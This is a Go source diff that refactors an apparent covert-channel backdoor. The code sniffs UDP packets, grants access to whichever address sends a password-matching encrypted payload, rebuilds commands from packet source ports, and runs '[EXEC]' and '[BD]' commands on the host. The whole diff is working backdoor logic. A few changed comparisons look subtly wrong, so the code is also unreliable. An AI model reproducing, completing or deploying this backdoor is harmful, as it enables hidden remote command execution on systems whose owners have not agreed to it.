@@ -29,6 +29,7 @@ import(
 	"os"
 	"time"
 	"os/exec"
+	"bytes"
 	"io"
 	"flag"
 	"encoding/binary"
@@ -138,9 +139,9 @@ func beginListen(ip string, port, lport uint16) {
 	var payload gopacket.Payload
 
 	i = 0
-	buffer := make([]byte, 10000000)
 	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer, &payload)
 	decoded := make([]gopacket.LayerType, 0, 4)
+	buffer := new(bytes.Buffer)
 	
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for {
@@ -158,46 +159,49 @@ func beginListen(ip string, port, lport uint16) {
 			continue
 		}
 
+		incomingIP := ipLayer.SrcIP.String()
+		
 		if pType == CLIENT {
-			buffer = clientControl(MAX_PORT - uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), lport, buffer)
+			if ipLayer.SrcIP.String()  == localip.String() && uint16(udpLayer.DstPort) == lport {
+
+				err = binary.Write(buffer, binary.LittleEndian, uint16(udpLayer.SrcPort))
+				checkError(err)
+
+				if(port == SND_CMPLETE){
+					fmt.Print(buffer)
+					buffer.Reset()
+				}
+			}
 		} else {
-			buffer = serverControl(MAX_PORT - uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), port, lport, buffer, []byte(udpLayer.Payload))
+			if incomingIP == authenticatedAddr {
+				
+				err = binary.Write(buffer, binary.LittleEndian, uint16(udpLayer.SrcPort))
+				checkError(err)
+				
+				if(port == SND_CMPLETE){
+
+					strData := buffer.String()
+					if strings.HasPrefix(strData, "[EXEC]") {
+						executeCommand(strData, incomingIP, port);
+					}
+					if strings.HasPrefix(strData, "[BD]") {
+						executeServerCommand(strData, incomingIP, port);
+					}
+					buffer.Reset()
+				}
+				
+			} else if port  == lport {
+				
+				data := decrypt_data(udpLayer.Payload)
+
+				if data == passwd {
+					fmt.Printf("Authcode recieved, opening communication with %s\n", incomingIP);
+					authenticatedAddr = incomingIP;
+				}
+			}
 		}
 		
 	}
-}
-func serverControl(val uint16, sIP string, port, dport, lport uint16, buffer []byte, payload []byte) []byte{
-
-	if sIP == authenticatedAddr {
-		
-		curr_bytes := make([]byte, 2)
-		binary.LittleEndian.PutUint16(curr_bytes, uint16(val)) 
-		copy(buffer[i:i+1], curr_bytes)
-		i = i + 2
-		
-		if(port == SND_CMPLETE){
-
-			if strings.HasPrefix(string(buffer), "[EXEC]") {
-				executeCommand(string(buffer), sIP, dport);
-			}
-			if strings.HasPrefix(string(buffer), "[BD]") {
-				executeServerCommand(string(buffer), sIP, dport);
-			}
-
-			buffer = buffer[:0]
-			i = 0
-		}
-	} else if port  == lport {
-		
-		data := decrypt_data(payload)
-
-		if data == passwd {
-			fmt.Printf("Authcode recieved, opening communication with %s\n", sIP);
-			authenticatedAddr = sIP;
-		}
-	}
-	
-	return buffer
 }
 /* 
     FUNCTION: func  executeServerCommand(data, ip string, port int) 
